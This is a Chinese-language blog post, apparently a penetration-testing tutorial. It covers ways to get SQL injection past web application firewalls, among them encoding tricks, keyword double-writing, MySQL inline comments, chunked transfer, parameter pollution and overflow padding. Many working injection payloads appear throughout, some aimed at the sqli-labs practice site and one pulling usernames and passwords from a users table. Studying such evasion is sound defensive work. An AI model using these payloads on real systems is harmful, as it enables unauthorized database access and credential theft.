<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入绕waf | 沐风的blog</title><meta name="author" content="沐风"><meta name="copyright" content="沐风"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="介绍多种waf绕过方式">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入绕waf">
<meta property="og:url" content="http://king-xyp.github.io/2025/09/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/index.html">
<meta property="og:site_name" content="沐风的blog">
<meta property="og:description" content="介绍多种waf绕过方式">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://king-xyp.github.io/img/touxiang.png">
<meta property="article:published_time" content="2025-09-11T01:44:45.000Z">
<meta property="article:modified_time" content="2025-09-15T12:24:55.093Z">
<meta property="article:author" content="沐风">
<meta property="article:tag" content="渗透测试">
<meta property="article:tag" content="SQL注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://king-xyp.github.io/img/touxiang.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SQL注入绕waf",
  "url": "http://king-xyp.github.io/2025/09/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/",
  "image": "http://king-xyp.github.io/img/touxiang.png",
  "datePublished": "2025-09-11T01:44:45.000Z",
  "dateModified": "2025-09-15T12:24:55.093Z",
  "author": [
    {
      "@type": "Person",
      "name": "沐风",
      "url": "http://king-xyp.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://king-xyp.github.io/2025/09/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":"ture","top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SQL注入绕waf',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/artitalk"><i class="fa-fw fas fa-lightbulb"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><!-- 左侧博客信息区域--><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">沐风的blog</span></a><a class="nav-page-title" href="/"><span class="site-name">SQL注入绕waf</span></a></span><!-- 新增的导航菜单容器（居中布局关键）--><div id="nav-menus-container"><!-- 菜单主体部分--><div id="menus"><!-- 菜单项--><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/artitalk"><i class="fa-fw fas fa-lightbulb"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><!-- 右侧功能区域（新增容器）--><div id="nav-right-container"><!-- 搜索按钮（移动到右侧）--><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><!-- 移动端汉堡菜单按钮--><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入绕waf</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-11T01:44:45.000Z" title="发表于 2025-09-11 09:44:45">2025-09-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-15T12:24:55.093Z" title="更新于 2025-09-15 20:24:55">2025-09-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="SQL注入绕WAF介绍"><a href="#SQL注入绕WAF介绍" class="headerlink" title="SQL注入绕WAF介绍"></a>SQL注入绕WAF介绍</h2><p>WAF（ Web Application Firewall ）Web应用防火墙。是针对 HTTP&#x2F;HTTPS 的安全策略来专门为Web应用提供检</p>
<p>测和保护的一个网络安全产品。WAF可以增大攻击者的攻击难度和攻击成本。WAF会对我们在程序中输入 的参数</p>
<p>进行检测和过滤，当检测到危险的参数值时就会对我们进行拦截，甚至是IP封 禁。</p>
<p>而SQL注入绕WAF则是利用一些技巧绕过WAF的防御检测，以使SQL语句能成功的带入到数据库中执行。</p>
<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p><strong>汇总：</strong></p>
<ul>
<li>等价替换</li>
<li>大小写绕过</li>
<li>编码绕过</li>
<li>N写绕过</li>
<li>空格字符绕过</li>
<li>内联注释绕过</li>
<li>更改请求方式</li>
<li>分块传输</li>
<li>参数污染</li>
<li>缓冲区溢出</li>
<li>随机数混淆</li>
</ul>
<h3 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h3><p>在程序员开发过程中有可能会禁用一些函数或关键字而无法使用，因此可以通过等价或类似的函数或关键字来达到相同的效果</p>
<blockquote>
<p>and -&gt; &amp;&amp;</p>
<p>or -&gt; ||</p>
<p>not -&gt; !</p>
<p>xot -&gt; |</p>
<p>&#x3D;  -&gt;  like</p>
<p>不等于 -&gt; &lt;&gt;</p>
<p>group_concat() -&gt; concat_ws()</p>
<p>sleep() -&gt; benchmark()</p>
<p>hex()、bin() -&gt; ascii()</p>
<p>mid() 、substr() -&gt; substring()</p>
<p>updatexml 、extractvalue() -&gt; polygon()</p>
<p>‘admin’ -&gt; 0x61646D696E</p>
</blockquote>
<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>同等价替换一样，有些函数是在开发时写死，通过随机大小写的方式可以绕过WAF的字符对比检测。</p>
<p>此处展示为sqli靶场第27关源码</p>
<p><img src="./1757558440009.png" alt="1757558440009"></p>
<p>从源码知过滤了常见的sql注入所用函数，如select 、union</p>
<p>但是源码并未对用户输入做相关处理，因此可以利用禁用列表中没有的字符进行注入，如UnioN，SelEcT等</p>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>编码绕过的原理是，攻击者在注入时采用了一些特殊的字符编码方式，从而绕过WAF的检测过程。这种编码绕</p>
<p>过的思路就是利用特殊的字符编码方式，将恶意SQL语句转化为WAF规则无法匹配的形式。例如WAF通常会拦截union select，单个不拦截 ，一起就进行拦截；</p>
<p>常用编码切换</p>
<blockquote>
<p>空格 -&gt; %0a || %0A  -&gt; &#x2F;**&#x2F;</p>
<p>‘ -&gt; %27</p>
<p>&#x3D; -&gt; %3d</p>
</blockquote>
<p>常用编码格式</p>
<ul>
<li>URL编码</li>
<li>十六进制编码</li>
<li>base64编码</li>
<li>Unicode编码</li>
</ul>
<h4 id="1-针对单个关键字的绕过："><a href="#1-针对单个关键字的绕过：" class="headerlink" title="1.针对单个关键字的绕过："></a>1.针对单个关键字的绕过：</h4><p>○ sel ̝ ect 程序过滤 ̝ 为空 脚本处理 </p>
<p>○ sele&#x2F;**&#x2F;**ct 程序过滤&#x2F;&#x2F;为空 </p>
<p>○ ˺ !%53eLEct ˧ url编码与内联注释 </p>
<p>○ se%0blect 使用空格绕过 </p>
<p>○ sele%ct 使用百分号绕过 </p>
<p>○ %53eLEct 编码绕过</p>
<h4 id="2-单次编码"><a href="#2-单次编码" class="headerlink" title="2.单次编码"></a>2.单次编码</h4><p>即将语句做一次编码，前提数据是通过WAF到服务器解析执行的过程仅执行一次解码动作，否则会因过度解码而造成语句无法数据库识别。</p>
<p>一次编码通常仅编码特殊字符</p>
<blockquote>
<p>?id&#x3D;1 union select database()<br>编码后</p>
<p>?id&#x3D;1%20union%20select%20database()</p>
</blockquote>
<h4 id="3-双重编码"><a href="#3-双重编码" class="headerlink" title="3.双重编码"></a>3.双重编码</h4><p>即对于浏览器发送的数据进行了两次编码操作，如s做一次url编码是%73, 再进行一次编码是%25%37%33。一般情况下数据经过WAF设备的时候只会做一次url解码，这样解码之后的数据一般不会匹配到规则，达到bypass的效果。</p>
<blockquote>
<p>?id&#x3D;1 union select 1</p>
<p>第一次编码</p>
<p>?id&#x3D;1%20union%20select%201</p>
<p>第二次编码</p>
<p>?id&#x3D;1%2520union%2520select%25201</p>
</blockquote>
<h4 id="4-Unicode编码"><a href="#4-Unicode编码" class="headerlink" title="4.Unicode编码"></a>4.Unicode编码</h4><p>IIS服务器支持对于unicode的解析，例如我们对于select中的字符进行unicode编码，可以得到如下的s%u006c%u0006ect，这种字符在IIS接收到之后会被转换为select，但是对于WAF层，可能接收到的内容还是s%u006c%u0006ect，这样就会形成bypass的可能。</p>
<table>
<thead>
<tr>
<th>字符</th>
<th><strong>Unicode</strong>编码</th>
</tr>
</thead>
<tbody><tr>
<td>a</td>
<td>%u0000 %u0041 %u0061 %u00aa %u00e2</td>
</tr>
<tr>
<td>单引号</td>
<td>%u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27%c0%a7 %e0%80%a7</td>
</tr>
<tr>
<td>空白</td>
<td>%u0020 %uff00 %c0%20 %c0%a0 %e0%80%a0</td>
</tr>
<tr>
<td>左括号(</td>
<td>%u0028 %uff08 %c0%28 %c0%a8 %e0%80%a8</td>
</tr>
<tr>
<td>右括号)</td>
<td>%u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9</td>
</tr>
</tbody></table>
<h3 id="N写绕过"><a href="#N写绕过" class="headerlink" title="N写绕过"></a>N写绕过</h3><p>一般情况下是通过双写来绕过WAF检测，同样是开发时写死的禁用函数</p>
<p>有时后端或WAF检测到禁用函数或关键字会将该字符串从语句删除，以清除SQL注入的威胁</p>
<p>当系统仅检测一次时可以使用双写绕过</p>
<p>如：union可以写成ununionion，在这串字符串中WAF可能会将其中的union删除只会保留最外层的union</p>
<p>当WAF会进行多次删除时，可以对禁用字符串多次嵌套来绕过检测，但通常如果三写绕不过的情况，嵌套再多也没用，因为WAF可能会重复删除。</p>
<h3 id="空格字符绕过"><a href="#空格字符绕过" class="headerlink" title="空格字符绕过"></a>空格字符绕过</h3><p>有些WAF会检测语句中相关关键字之间的空格，那么我们通过替换的方式可以尝试绕过WAF</p>
<p>常见URL转码。  </p>
<blockquote>
<p> 空格 %20</p>
<p> %09 TAB键（水平）</p>
<p> %0a 换行</p>
<p> %0d 回车</p>
<p> %a0 空格  </p>
</blockquote>
<p>常见用法</p>
<blockquote>
<p> &#x2F;**&#x2F;代替空格 </p>
<p> ()代替空格</p>
<p> 回车（url编码中的%0a）</p>
<p> &#96;&#96;(两个反引号)</p>
<p> 两个空格代替一个空格</p>
<p> TAB  代替空格</p>
</blockquote>
<p>示例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>users;</span><br><span class="line">#注意括号中不能含有<span class="operator">*</span></span><br><span class="line"><span class="keyword">select</span>(id)<span class="keyword">from</span>(users);</span><br><span class="line"><span class="keyword">select</span> `id`<span class="keyword">from</span>`users`<span class="keyword">where</span>`id`<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>



<h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>常用注释符</p>
<blockquote>
<p>&#x2F;&#x2F;, – , &#x2F;**&#x2F;, #, –+,–  -, ;，–a</p>
</blockquote>
<p> 内联注释符 <code>/**/ </code>。在MySQL中如果内联注释  <code>/*!*/</code> 这样编写那么注释里面的内容将会被执行。  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!select database() */</span></span><br><span class="line">?<span class="keyword">user</span><span class="operator">=</span>admin<span class="string">&#x27; ˺ /*select database() */ ˯ +</span></span><br><span class="line"><span class="string">识别</span></span><br><span class="line"><span class="string">waf ：?id=1 /*</span></span><br><span class="line"><span class="string">sql : ?id=1 /*!select databae()*/</span></span><br></pre></td></tr></table></figure>

<p>内联注释就是把一些MySQL语句放在 &#x2F;<em>!…</em>&#x2F;中.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="comment">/*! !union select 1,2,3,4 */</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="comment">/*!union*/</span><span class="comment">/*!select ˧ 1,2,3,4*/</span>;</span><br></pre></td></tr></table></figure>

<p>内联注释常用方法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--简单内联注释</span></span><br><span class="line">id<span class="operator">=</span><span class="number">100</span><span class="comment">/*!union*/</span><span class="keyword">select</span></span><br><span class="line"><span class="comment">--增加干扰符，绕过waf对内联注释的黑名单机制</span></span><br><span class="line">Id<span class="operator">=</span><span class="number">-2</span><span class="comment">/*%!&quot;/*/</span><span class="keyword">union</span><span class="comment">/*%!&quot;/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="comment">--多重内联注释绕过单层检测（类似双写）</span></span><br><span class="line">Id<span class="operator">=</span><span class="number">100</span><span class="comment">/*!/*!union*/</span><span class="operator">*</span><span class="operator">/</span><span class="keyword">select</span></span><br><span class="line"><span class="comment">--多个语句或单词运用内联注释</span></span><br><span class="line">Id<span class="operator">=</span><span class="number">100</span><span class="comment">/*!/*!union*/</span><span class="operator">*</span><span class="operator">/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="comment">/*!table_name*/</span> <span class="comment">/*!from*/</span> <span class="comment">/*!information_schema.tables where table_schema=database()*/</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="comment">--注释变量参数</span></span><br><span class="line">Id<span class="operator">=</span><span class="number">-1</span><span class="operator">+</span><span class="keyword">UnIoN</span><span class="comment">/*&amp;s=*/</span><span class="keyword">sEleCT</span><span class="comment">/*&amp;s=*/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,database(),<span class="number">5</span>,<span class="number">6</span>#</span><br></pre></td></tr></table></figure>



<h3 id="更改请求方式"><a href="#更改请求方式" class="headerlink" title="更改请求方式"></a>更改请求方式</h3><p>八种请求方式：</p>
<blockquote>
<p>GET、PUT、POST、DELECT、HEAD、OPTIONS、CONNECT、TRACE</p>
</blockquote>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>GET</td>
<td>请求指定的页面信息，并返回实体主体。</td>
</tr>
<tr>
<td>HEAD</td>
<td>类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头</td>
</tr>
<tr>
<td>POST</td>
<td>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。</td>
</tr>
<tr>
<td>PUT</td>
<td>从客户端向服务器传送的数据取代指定的文档的内容。</td>
</tr>
<tr>
<td>DELETE</td>
<td>请求服务器删除指定的页面。</td>
</tr>
<tr>
<td>CONNECT</td>
<td>HTTP&#x2F;1.1协议中预留给能够将连接改为管道方式的代理服务器。</td>
</tr>
<tr>
<td>OPTIONS</td>
<td>允许客户端查看服务器的性能。</td>
</tr>
<tr>
<td>TRACE</td>
<td>回显服务器收到的请求，主要用于测试或诊断。</td>
</tr>
</tbody></table>
<p>更换提交方式：为上传文件数据包类型</p>
<p><img src="./1757573150157.png" alt="1757573150157"></p>
<p><img src="./1757573176678.png" alt="1757573176678"></p>
<h3 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h3><p>分块传输 （Chunked transfer encoding） 是超文本传输协议(http) 中的一种数据传输机制，允许将HTTP数据包分为多个部分发送出去。</p>
<ul>
<li>响应头设定：在HTTP请求头部，添加 Transfer-Encoding: chunked 来指明采用分块传输。</li>
<li>数据分块：数据被分割成一系列的小块（chunk）。每个块的格式如下：<ul>
<li>块大小：每个块以十六进制形式指定其大小（字节数），之后是回车和换行符（\r\n）。</li>
<li>数据块内容：接下来是实际的内容数据，再次用\r\n表示块的结束。</li>
<li>终止块：传输结束时，服务器发送一个大小为0的块，表示传输完成。</li>
</ul>
</li>
</ul>
<p>示例：要向服务器传输“Hello，World!”</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="operator">/</span> HTTP<span class="operator">/</span><span class="number">1.1</span></span><br><span class="line">Host: www.tommonkey.cn</span><br><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="operator">/</span><span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">131.0</span>) Gecko<span class="operator">/</span><span class="number">20100101</span> Firefox<span class="operator">/</span><span class="number">131.0</span></span><br><span class="line">Transfer<span class="operator">-</span>Encoding: chunked</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>\r\n</span><br><span class="line">Hello\r\n</span><br><span class="line"><span class="number">7</span>\r\n</span><br><span class="line">, World<span class="operator">!</span>\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注：POST方式才能进行分块传输，尾部需要添加两个换行</p>
<h3 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h3><p>介绍：HTTP参数污染即HPP（HTTP Parameter Pollution） </p>
<p>浏览器在和服务器进行交互的过程中，浏览器往往会在 POST&#x2F;GET请求里面携带参数 ,这些参数会以 名称&#x3D;值 形式出现，通常在一个请求中，同样名称的参只会出现一次。但是HTTP协议时允许同样名称的参数出现多次的。</p>
<blockquote>
<p> id&#x3D;1&amp;id&#x3D;2</p>
</blockquote>
<p>如：<code>http://192.168.10.1/?id=1&amp;id=12</code> ,针对同名参数出现多次的情况，不同Web服务器处理的方式不一样，有些取第二个参数值，有的取第一个参数值，还有的服务器全取。这种特性在绕过一些服务端的逻辑判断时非常有用。</p>
<table>
<thead>
<tr>
<th>Web服务器</th>
<th>参数获取函数</th>
<th>获取到的参数</th>
</tr>
</thead>
<tbody><tr>
<td>PHP&#x2F;Apache</td>
<td>$_GET(“par”)</td>
<td>Last</td>
</tr>
<tr>
<td>JSP&#x2F;Tomcat</td>
<td>Request.getParameter(“par”)</td>
<td>First</td>
</tr>
<tr>
<td>Perl(CGI)&#x2F;Apache</td>
<td>Param(“par”)</td>
<td>First</td>
</tr>
<tr>
<td>Python&#x2F;Apache</td>
<td>getvalue(“par”)</td>
<td>All(list)</td>
</tr>
<tr>
<td>ASP&#x2F;IIS</td>
<td>Request.QueryString(“par”)</td>
<td>ALL(comma-delimited string)</td>
</tr>
</tbody></table>
<p>演示（php&#x2F;Apache）<code>http://192.168.174.147/hpp.php?id=1/&amp;id=-1 union select 1,2,3 %23/</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">echo $id;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="./image.png" alt="null"></p>
<p>利用参数污染绕过安全狗</p>
<blockquote>
<p>http: ˾ 192.168.174.135&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1 &#x2F;<em>&amp;id&#x3D;-1 union select 1,2,3 %23</em>&#x2F;</p>
</blockquote>
<h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p>
<p>举例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span>)<span class="operator">=</span>(<span class="keyword">Select</span> <span class="number">0xA</span><span class="operator">*</span><span class="number">1000</span>)<span class="operator">+</span><span class="keyword">UnIoN</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,version(),<span class="number">4</span>,<span class="number">5</span>,database(),<span class="keyword">user</span>(),<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span></span><br></pre></td></tr></table></figure>

<p>示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出</p>
<h3 id="随机数混淆"><a href="#随机数混淆" class="headerlink" title="随机数混淆"></a>随机数混淆</h3><p>采用随机数混淆的策略可以让Payload在每次注入时都不同，从而增加了WAF检测的难度。同时，由于随机数的不可预测性，攻击者可以借助随机的结果来判断注入是否成功，而WAF却无法识别这一点。</p>
<p>示例Payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT username, password FROM users WHERE id=1 AND 1=(SELECT RAND() &lt; 0.5) --</span></span><br></pre></td></tr></table></figure>

<p>使用RAND()函数生成0~1之间的随机数并与0.5比较，随机数小于0.5语句为：</p>
<blockquote>
<p>UNION SELECT username, password FROM users WHERE id&#x3D;1 AND 1&#x3D;1</p>
</blockquote>
<p>当生成的随机数大于等于0.5时，Payload会变成：</p>
<blockquote>
<p>UNION SELECT username, password FROM users WHERE id&#x3D;1 AND 1&#x3D;0</p>
</blockquote>
<p>对应代码执行成功和失败两种情况</p>
